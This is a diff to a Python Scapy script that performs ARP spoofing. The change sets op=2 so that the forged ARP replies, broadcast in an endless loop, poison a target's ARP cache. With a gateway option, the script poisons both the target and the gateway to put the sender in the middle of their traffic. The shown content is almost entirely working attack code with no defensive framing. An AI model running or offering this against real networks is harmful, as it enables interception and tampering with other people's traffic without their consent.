@@ -36,7 +36,7 @@ target = args.target
 # If input doesn't include gw then only spoof target
 if not args.gw:
     while True:
-        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target, psrc=src, hwsrc=get_if_hwaddr(interface))
+        arp_request = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target, psrc=src, hwsrc=get_if_hwaddr(interface))
         # print("sending '" + src + " is at ' to " + target + " using " + interface) needs to send mac so it isn't 00:00...
         sendp(arp_request, iface=interface)
         time.sleep(DELAY)
@@ -44,10 +44,10 @@ if not args.gw:
 # Else (-gw is inputted) then man in the middle target
 else:
     while True:
-        arp_request_for_target = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=target, psrc=src, hwsrc=get_if_hwaddr(interface))
+        arp_request_for_target = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=target, psrc=src, hwsrc=get_if_hwaddr(interface))
         # print("sending '" + src + " is at ' to " + target + " using " + interface) needs to send mac so it isn't 00:00...
         sendp(arp_request_for_target, iface=interface)
-        arp_request_for_gateway = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=src, psrc=target, hwsrc=get_if_hwaddr(interface))
+        arp_request_for_gateway = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(op=2, pdst=src, psrc=target, hwsrc=get_if_hwaddr(interface))
         # print("sending '" + target + " is at ' to " + src + " using " + interface) needs to send mac so it isn't 00:00...
         sendp(arp_request_for_gateway, iface=interface)
         time.sleep(DELAY)
